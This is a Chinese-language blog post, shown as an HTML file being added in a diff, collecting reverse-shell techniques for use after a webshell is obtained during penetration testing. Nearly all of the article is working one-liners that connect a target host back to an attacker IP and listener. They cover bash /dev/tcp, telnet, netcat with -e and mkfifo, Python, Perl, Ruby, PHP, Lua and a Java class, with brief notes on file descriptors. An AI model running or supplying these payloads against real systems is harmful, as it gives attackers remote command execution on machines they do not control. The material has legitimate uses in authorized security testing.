@@ -1,0 +1,311 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>反弹shell姿势 | Gridea</title>
+<link rel="shortcut icon" href="https://piaogexu.github.io/favicon.ico?v=1606548080714">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://piaogexu.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="反弹shell姿势 | Gridea - Atom Feed" href="https://piaogexu.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="反弹shell的N种姿势
+0x00 前言
+在渗透测试的过程中，在拿到webshell以后，如果目标主机是Windows主机，则是通过开3389端口在远程连接，如果目标主机是linux服务器，一般我们都会选择反弹shell来进行操作。在这里总..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://piaogexu.github.io">
+  <img class="avatar" src="https://piaogexu.github.io/images/avatar.png?v=1606548080714" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              反弹shell姿势
+            </h2>
+            <div class="post-info">
+              <span>
+                2020-11-28
+              </span>
+              <span>
+                7 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h3 id="反弹shell的n种姿势">反弹shell的N种姿势</h3>
+<h4 id="0x00-前言">0x00 前言</h4>
+<p>在渗透测试的过程中，在拿到webshell以后，如果目标主机是Windows主机，则是通过开3389端口在远程连接，如果目标主机是linux服务器，一般我们都会选择反弹shell来进行操作。在这里总结下反弹shell常见的几种姿势。</p>
+<h4 id="0x01-bash反弹">0x01 Bash反弹</h4>
+<h5 id="11-方法一">1.1 方法一</h5>
+<p>攻击者主机上执行监听：</p>
+<pre><code>nc -lvvp port
+</code></pre>
+<p>目标主机上执行：</p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/x.x.x.x/port 0&gt;&amp;1
+
+#bash -i   打开一个交互的bash
+#&gt;&amp;   将标准错误输出重定向到标准输出
+#/dev/tcp/x.x.x.x/port   意为调用socket,建立socket连接,其中x.x.x.x为要反弹到的主机ip，port为端口
+#0&gt;&amp;1   标准输入重定向到标准输出，实现你与反弹出来的shell的交互
+</code></pre>
+<p><strong><em>注</em>：/dev/tcp/ 是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。</strong></p>
+<p>linux shell下常用的文件描述符是：</p>
+<p>1.标准输入 (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ；</p>
+<p>2.标准输出 (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ；</p>
+<p>3.标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;。</p>
+<p>另外由于不同Linux发行版之间的差异，该命令在某些系统上可能并不适用。</p>
+<h5 id="12-方法二">1.2 方法二</h5>
+<pre><code>exec 0&amp;0 2&gt;&amp;0
+
+0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/x.x.x.x/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196
+
+/bin/bash  -i &gt; /dev/tcp/x.x.x.x/8080 0&lt;&amp;1 2&gt;&amp;1
+</code></pre>
+<h5 id="13-方法三">1.3 方法三</h5>
+<pre><code>exec 5&lt;&gt;/dev/tcp/x.x.x.x/4444;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done
+</code></pre>
+<h4 id="0x02-telnet反弹">0x02 telnet反弹</h4>
+<h5 id="21-方法一">2.1 方法一</h5>
+<p>攻击者主机上打开两个终端分别执行监听：</p>
+<pre><code>nc -lvvp 4444
+
+nc -lvvp 5555
+</code></pre>
+<p>目标主机中执行：</p>
+<pre><code>telnet x.x.x.x 4444 | /bin/bash | telnet x.x.x.x 5555
+</code></pre>
+<p>监听两个端口分别用来输入和输出，其中x.x.x.x均为攻击者ip</p>
+<p>反弹shell成功后，在监听4444端口的终端中执行命令可以在另一个终端中看到命令执行结果。</p>
+<h5 id="22-方法二">2.2 方法二</h5>
+<pre><code>rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet x.x.x.x 4444 0/tmp/p
+</code></pre>
+<h5 id="0x03-ncnetcat反弹">0x03 nc（netcat）反弹</h5>
+<p>攻击者主机上执行监听命令：</p>
+<pre><code>nc -lvvp port
+</code></pre>
+<p>目标主机上执行：</p>
+<pre><code>nc -e /bin/bash x.x.x.x port
+</code></pre>
+<p>如果目标主机linux发行版本没有 -e 参数，还有以下几种方式：</p>
+<pre><code>rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc x.x.x.x 9999 &gt;/tmp/f
+</code></pre>
+<p><strong>注：mkfifo 命令的作用是创建FIFO特殊文件，通常也称为命名管道，FIFO文件在磁盘上没有数据块，仅用来标识内核中的一条通道，各进程可以打开FIFO文件进行read/write，实际上是在读写内核通道（根本原因在于FIFO文件结构体所指向的read、write函数和常规文件不一样），这样就实现了进程间通信</strong></p>
+<pre><code>nc x.x.x.x 4444|/bin/bash|nc x.x.x.x 5555   #从4444端口获取到命令，bash 运行后将命令执行结果返回 5555 端口，攻击者主机上也是打开两个终端分别执行监听。
+
+nc -c /bin/sh x.x.x.x 4444
+
+/bin/sh | nc x.x.x.x 4444
+</code></pre>
+<h4 id="0x04-常见脚本反弹">0x04 常见脚本反弹</h4>
+<h5 id="41-python">4.1 python</h5>
+<pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;x.x.x.x&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);'
+</code></pre>
+<h5 id="42-perl">4.2 perl</h5>
+<p><strong>4.2.1 方法一</strong></p>
+<pre><code>perl -e 'use Socket;$i=&quot;x.x.x.x&quot;;$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
+</code></pre>
+<p><strong>4.2.2 方法二</strong></p>
+<pre><code>perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;x.x.x.x:5555&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'
+</code></pre>
+<h5 id="43-ruby">4.3 Ruby</h5>
+<p><strong>4.3.1 方法一</strong></p>
+<pre><code>ruby -rsocket -e 'exit if fork;c=TCPSocket.new(&quot;x.x.x.x&quot;,&quot;5555&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end'
+</code></pre>
+<p><strong>4.3.2 方法二</strong></p>
+<pre><code>ruby -rsocket -e'f=TCPSocket.open(&quot;x.x.x.x&quot;,5555).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)'
+</code></pre>
+<h4 id="44-php">4.4 PHP</h4>
+<pre><code>php -r '$sock=fsockopen(&quot;x.x.x.x&quot;,5555);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
+</code></pre>
+<h4 id="45-java">4.5 java</h4>
+<pre><code>public class Revs {
+/**
+* @param args
+* @throws Exception 
+*/
+public static void main(String[] args) throws Exception {
+    // TODO Auto-generated method stub
+    Runtime r = Runtime.getRuntime();
+    String cmd[]= {&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;};
+    Process p = r.exec(cmd);
+    p.waitFor();
+}
+}
+</code></pre>
+<h4 id="46-lua">4.6 Lua</h4>
+<pre><code>lua -e &quot;require('socket');require('os');t=socket.tcp();t:connect('x.x.x.x','5555');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');&quot;
+</code></pre>
+<p><strong>注：以上脚本是在目标主机上执行，其中 x.x.x.x 均为攻击者ip，并且需要在攻击者主机上进行监听:</strong></p>
+<pre><code>nc -lvvp 5555
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#%E5%8F%8D%E5%BC%B9shell%E7%9A%84n%E7%A7%8D%E5%A7%BF%E5%8A%BF">反弹shell的N种姿势</a>
+<ul>
+<li><a href="#0x00-%E5%89%8D%E8%A8%80">0x00 前言</a></li>
+<li><a href="#0x01-bash%E5%8F%8D%E5%BC%B9">0x01 Bash反弹</a>
+<ul>
+<li><a href="#11-%E6%96%B9%E6%B3%95%E4%B8%80">1.1 方法一</a></li>
+<li><a href="#12-%E6%96%B9%E6%B3%95%E4%BA%8C">1.2 方法二</a></li>
+<li><a href="#13-%E6%96%B9%E6%B3%95%E4%B8%89">1.3 方法三</a></li>
+</ul>
+</li>
+<li><a href="#0x02-telnet%E5%8F%8D%E5%BC%B9">0x02 telnet反弹</a>
+<ul>
+<li><a href="#21-%E6%96%B9%E6%B3%95%E4%B8%80">2.1 方法一</a></li>
+<li><a href="#22-%E6%96%B9%E6%B3%95%E4%BA%8C">2.2 方法二</a></li>
+<li><a href="#0x03-ncnetcat%E5%8F%8D%E5%BC%B9">0x03 nc（netcat）反弹</a></li>
+</ul>
+</li>
+<li><a href="#0x04-%E5%B8%B8%E8%A7%81%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9">0x04 常见脚本反弹</a>
+<ul>
+<li><a href="#41-python">4.1 python</a></li>
+<li><a href="#42-perl">4.2 perl</a></li>
+<li><a href="#43-ruby">4.3 Ruby</a></li>
+</ul>
+</li>
+<li><a href="#44-php">4.4 PHP</a></li>
+<li><a href="#45-java">4.5 java</a></li>
+<li><a href="#46-lua">4.6 Lua</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://piaogexu.github.io/post/zhan-ku-fen-chi-shen-tou-si-lu/">
+              <h3 class="post-title">
+                站库分离渗透思路
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://piaogexu.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
